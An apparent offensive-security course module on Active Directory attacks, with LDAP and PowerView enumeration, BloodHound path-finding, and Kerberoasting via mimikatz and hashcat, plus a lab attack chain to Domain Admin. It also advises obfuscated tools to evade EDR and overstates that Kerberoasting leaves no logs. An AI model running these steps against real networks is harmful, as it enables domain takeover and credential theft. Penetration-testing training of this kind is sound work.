Module 19: Active Directory RESEARCH IN PROGRESS

Module 19 of 22 — The domain is the kingdom

🧠 The Core Truth

Active Directory (AD) is not just a directory — it's the nerve center of every enterprise Windows network. It stores who you are, what you can do, what computers exist, what groups matter, and what trust relationships bridge domains. Compromise AD, and you don't just own one computer — you own the entire organization. Every account, every server, every secret.

🎯 Soldier Translation

AD is the personnel file cabinet, the building access control, and the communication network — all in one. If you get the master key (Domain Admin), you can open any door, read any file, and impersonate any employee. This module teaches you to map the castle before you storm it.

The Active Directory Hierarchy

🏰 DOMAIN (e.g., corp.example.com)

The top-level security boundary. Contains all users, computers, and groups. Trusts other domains.

📁 ORGANIZATIONAL UNIT (OU)

Container for organizing objects. "Sales", "IT", "Executives". Policies apply at OU level.

👤 USER/COMPUTER/GROUP

The actual objects. Users have passwords. Computers have accounts. Groups have memberships.

Method 1: LDAP Reconnaissance

Step 1: Enumerate Without Credentials

LDAP (Lightweight Directory Access Protocol) is the query language for AD. Anonymous binding is often enabled — meaning you can query AD without any username or password.

=== LDAP ANONYMOUS BIND === # Test if anonymous bind is allowed ldapsearch -x -H ldap://dc.corp.example.com -b "dc=corp,dc=example,dc=com" "(objectClass=user)" dn # If successful, you get a list of all user DNs: # dn: CN=Administrator,CN=Users,DC=corp,DC=example,DC=com # dn: CN=jsmith,CN=Users,DC=corp,DC=example,DC=com # dn: CN=bjohnson,OU=Sales,DC=corp,DC=example,DC=com === LDAP QUERY: FIND DOMAIN ADMINS === ldapsearch -x -H ldap://dc.corp.example.com \ -b "dc=corp,dc=example,dc=com" \ "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=example,DC=com)" \ sAMAccountName # Result: List of all Domain Admin usernames
Why anonymous bind exists

Some applications need to query AD for user info without authenticating. Directory services, email systems, etc. Administrators often enable anonymous bind for convenience and forget to restrict what anonymous users can see. The default: everything.

Step 2: Enumerate with Valid Credentials

If you have any valid domain account (even a low-privilege user), you can query AD for valuable information.

=== POWERVIEW (PowerShell) === # Import PowerView (part of PowerSploit) Import-Module PowerView.ps1 # Get current domain Get-NetDomain # Get all users in domain Get-NetUser | Select-Object samaccountname, description, lastlogon # Get all groups Get-NetGroup | Select-Object name, membercount # Get Domain Admins group members Get-NetGroupMember -GroupName "Domain Admins" | Select-Object MemberName # Get all computers Get-NetComputer | Select-Object name, operatingsystem # Find users with SPN (Kerberoast targets) Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname # Find users with "Password Never Expires" Get-NetUser -PasswordNeverExpires | Select-Object samaccountname
Import-Module PowerView.ps1; Get-NetDomain
⚠️ PowerView detection

PowerView is a known offensive tool. EDR may flag it. Use obfuscated versions, or write your own LDAP queries using System.DirectoryServices. The queries are the same — the tool is just a wrapper.

Method 2: BloodHound — The AD Mapper

Step 3: Visualize Attack Paths

BloodHound ingests AD data and shows you the shortest path from your current position to Domain Admin. It's like Google Maps for hacking.

=== BLOODHOUND DATA COLLECTION === # Run SharpHound (C# ingestor) on a domain-joined machine SharpHound.exe --CollectionMethod All --Domain corp.example.com # Output: ZIP file with JSON data # 20260629123456_BloodHound.zip === BLOODHOUND ANALYSIS === # Upload ZIP to BloodHound GUI (Neo4j backend) # Click "Analysis" → "Find Shortest Paths to Domain Admin" # Result: Visual graph showing: # You (User) → MemberOf → GroupA → AdminTo → ComputerB → HasSession → DomainAdmin # Translation: You're in GroupA. GroupA admins ComputerB. DomainAdmin has session on ComputerB. # Attack: Compromise ComputerB, steal DomainAdmin's session/token.
Why BloodHound is revolutionary

Before BloodHound, AD pentesting was manual: run queries, read output, build mental model. BloodHound automates the mapping and finds paths you would never see. A chain of 5 indirect relationships that leads to Domain Admin — invisible to manual analysis, obvious to graph theory.

Method 3: Kerberoasting

Step 4: Steal Service Account Passwords

Service accounts (SQL, IIS, etc.) often have SPNs (Service Principal Names). Kerberos tickets for these SPNs are encrypted with the service account's password. Request the ticket, crack it offline.

=== KERBEROASTING === # Step 1: Find SPNs (from PowerView) Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname # Step 2: Request tickets for all SPNs Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \ -ArgumentList "MSSQLSvc/sql01.corp.example.com:1433" # Step 3: Export tickets from memory mimikatz # kerberos::list /export # Step 4: Crack offline with hashcat hashcat -m 13100 kerberos_ticket.txt /usr/share/wordlists/rockyou.txt # Result: If password is weak, you get the service account credentials. # Service accounts often have Domain Admin rights (for convenience).
⚠️ Why this works

Kerberos tickets are encrypted with the service account's password hash. Anyone can request a ticket for any SPN — no special permissions needed. The ticket is encrypted, but you can take it home and crack it at your leisure. If the password is "Password123", you'll have it in minutes.

Lab Exercise: Map a Domain

Scenario

You have a low-privilege domain account: "jsmith" / "Password1". Map the domain and find a path to Domain Admin.

  1. Run Get-NetDomain — verify domain context
  2. Run Get-NetUser — enumerate all users
  3. Run Get-NetGroupMember "Domain Admins" — find targets
  4. Run Get-NetComputer — find interesting machines
  5. Run SharpHound, upload to BloodHound
  6. Find shortest path to Domain Admin
  7. Document the attack chain
=== ANALYSIS WORKFLOW === 1. Verify domain context Get-NetDomain → Domain: corp.example.com → Domain Controller: dc01.corp.example.com 2. Enumerate users Get-NetUser | Select-Object samaccountname, description → Administrator (built-in admin) → jsmith (you) → bjohnson (IT staff, description: "SQL admin") → mgarcia (Sales, description: "Password: Summer2024!") 3. Find Domain Admins Get-NetGroupMember "Domain Admins" → Administrator → bjohnson 4. Find bjohnson's relationships Get-NetUser -Identity bjohnson → MemberOf: SQL_Admins, IT_Staff → AdminTo: SQL01, WEB01 5. BloodHound path jsmith → MemberOf → Sales_Group → GenericAll → mgarcia mgarcia → HasSession → WEB01 WEB01 → AdminTo → SQL01 SQL01 → HasSession → bjohnson bjohnson → MemberOf → Domain Admins Attack chain: 1. Compromise mgarcia (weak password in description) 2. Use mgarcia's session on WEB01 3. Escalate from WEB01 to SQL01 (AdminTo) 4. Steal bjohnson's session on SQL01 5. bjohnson is Domain Admin

Key Takeaways

  • AD is the target: One Domain Admin = entire kingdom
  • LDAP is the recon tool: Anonymous bind often works. Any valid account reveals everything.
  • BloodHound finds invisible paths: Graph analysis reveals attack chains you'd never see manually
  • Kerberoasting is passive: Request tickets, crack offline. No alerts, no logs.
  • Service accounts are weak: Rarely changed, often shared, frequently overprivileged
